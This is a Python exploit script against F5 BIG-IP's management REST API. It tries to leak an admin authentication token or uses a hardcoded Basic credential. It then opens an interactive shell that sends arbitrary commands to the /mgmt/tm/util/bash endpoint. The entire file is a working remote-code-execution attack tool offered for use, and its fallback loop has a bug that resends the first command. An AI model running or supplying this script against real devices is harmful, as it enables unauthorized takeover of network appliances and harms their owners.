import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
import sys

def exploit(url, command):
	#print('(*) Tested: %s'%(url))
	vuln_leak_token = url + '/mgmt/shared/authn/login'
	data_leak_token = {"bigipAuthCookie":"","username":"admin","loginReference":{"link":"/shared/gossip"},"userReference":{"link":"https://localhost/mgmt/shared/authz/users/admin"}}
	try_leak = requests.post(vuln_leak_token, headers={"User-Agent": "hello-world","Content-Type":"application/x-www-form-urlencoded"}, json=data_leak_token, verify=False, timeout=15)
	if "/mgmt/shared/authz/tokens/" not in try_leak.text:
		print('(-) Cant leak token!!!')
		print('(*) Tested Method 2:') #im not sure about that...
		headers_poc2 = {
		    'User-Agent': 'hello-world',
		    'Content-Type': 'application/json',
		    'X-F5-Auth-Token': '',
		    'Authorization': 'Basic YWRtaW46QVNhc1M='
		}
		data = {"command": "run", "utilCmdArgs": "-c '%s'"%(command)}
		check_url = url + '/mgmt/tm/util/bash'
		try:
			r = requests.post(url=check_url, json=data, headers=headers_poc2, verify=False, timeout=20)
			if r.status_code == 200 and 'commandResult' in r.text:
				while True:
					cmd = input("(:CMD)> ")
					data_1 = {"command": "run", "utilCmdArgs": "-c '%s'"%(cmd)}
					r = requests.post(url=check_url, json=data, headers=headers_poc2, verify=False)
					if r.status_code == 200 and 'commandResult' in r.text:
						print(r.text.split('commandResult":"')[1].split('"}')[0].replace('\\n', ''))
			else:
				print('(-) Not vuln...')
				exit(0)
		except Exception:
			print('ERROR Connect')
	print('(+) Extract token: %s'%(try_leak.text.split('"selfLink":"localhost/mgmt/shared/authz/tokens/')[1].split('"}')[0]))
	while True:
		cmd = input("(:CMD)> ")
		headers = {
		"Content-Type": "application/json",
		"X-F5-Auth-Token": "%s"%(try_leak.text.split('"selfLink":"localhost/mgmt/shared/authz/tokens/')[1].split('"}')[0])
		}
		data_json = {"command": "run", "utilCmdArgs": "-c \'%s\'"%(cmd)}
		vuln_rce = url + '/mgmt/tm/util/bash'
		rce_req = requests.post(vuln_rce, headers=headers, json=data_json, verify=False, timeout=15)
		if rce_req.status_code == 200 and 'commandResult' in rce_req.text:
			print(rce_req.text.split('commandResult":"')[1].split('"}')[0].replace('\\n', ''))
		else:
			print('(-) Not vuln...')
			exit(0)
if(len(sys.argv) < 2):
	print('\r\n--------------------\n+ Author: github.com/Udyz\n+ twitter.com/lotusdll\n--------------------\n[*] USAGE: ./%s <host>\n'%(sys.argv[0]))
	exit(0)
try:
	exploit('https://'+sys.argv[1], "whoami")
except KeyboardInterrupt:
	exit(0)
except(requests.ConnectionError, requests.ConnectTimeout, requests.ReadTimeout) as e:
	print(e)
	exit()
